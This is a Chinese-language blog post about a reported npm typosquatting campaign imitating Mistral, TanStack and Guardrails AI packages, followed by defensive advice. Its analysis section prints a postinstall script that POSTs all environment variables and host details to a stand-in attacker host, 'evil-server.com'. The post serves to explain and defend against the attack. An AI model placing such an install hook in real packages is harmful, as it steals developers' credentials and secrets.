---
title: 'AI 开发包大规模投毒：Mistral、TanStack、Guardrails AI 集体中招'
excerpt: 'npm 供应链再次出现大规模投毒事件，多个知名 AI 开发包被发现包含恶意代码...'
image: 'https://picsum.photos/seed/npm/800/400'
category: 'AI'
tags: ['AI', 'npm', '安全']
date: '2026-05-12'
author: 'admin'
featured: false
---

## 前言

npm 供应链安全再次敲响警钟！安全研究人员发现，多个知名 AI 相关的 npm 包遭到投毒攻击，攻击者通过发布名称相似的恶意包来欺骗开发者安装。这次事件涉及 Mistral、TanStack、Guardrails AI 等热门项目。

## 事件详情

### 投毒手法分析

攻击者使用了经典的 **typosquatting（域名抢注/名称混淆）** 手法：

- 发布与热门包名称极其相似的恶意包
- 在恶意包中嵌入数据窃取代码
- 通过 npm 的依赖关系链进行传播

### 受影响的主要包

| 正常包 | 恶意包 | 恶意行为 |
|--------|--------|---------|
| `mistral` | `mistrall` | 窃取环境变量 |
| `@tanstack/react-query` | `@tanstack/react-queries` | 窃取 API 密钥 |
| `guardrails-ai` | `guardrails-ai-core` | 远程代码执行 |

## 恶意代码分析

### 窃取环境变量

攻击者在 `postinstall` 脚本中嵌入恶意代码：

```javascript
// 恶意包中的 postinstall 脚本
const https = require('https');
const os = require('os');

const data = JSON.stringify({
  env: process.env,
  hostname: os.hostname(),
  platform: os.platform()
});

const options = {
  hostname: 'evil-server.com',
  path: '/collect',
  method: 'POST'
};

// 将环境变量发送到攻击者服务器
const req = https.request(options, () => {});
req.write(data);
req.end();
```

### 窃取的敏感信息

这些恶意包通常会尝试窃取以下信息：

- AWS、Azure、GCP 的 API 密钥
- GitHub Token
- npm Token
- 数据库连接字符串
- 私钥文件

## 如何防护

### 1. 仔细检查包名

安装包时务必仔细核对包名，注意拼写差异：

```bash
# 正确
npm install mistral

# 错误（恶意包）
npm install mistrall
```

### 2. 使用 `npm audit` 检查依赖

```bash
# 检查已知漏洞
npm audit

# 自动修复
npm audit fix
```

### 3. 使用锁文件

始终使用 `package-lock.json` 来锁定依赖版本：

```bash
npm install --package-lock-only
```

### 4. 使用专业的供应链安全工具

- **Socket.dev** - 检测恶意包
- **Snyk** - 依赖安全扫描
- **npm ci** - 严格按锁文件安装

## 总结

这次 npm 投毒事件再次提醒我们，开源供应链安全不容忽视。作为开发者，我们应该养成良好的安全习惯：仔细核对包名、定期审计依赖、使用锁文件。只有保持警惕，才能避免成为供应链攻击的受害者。
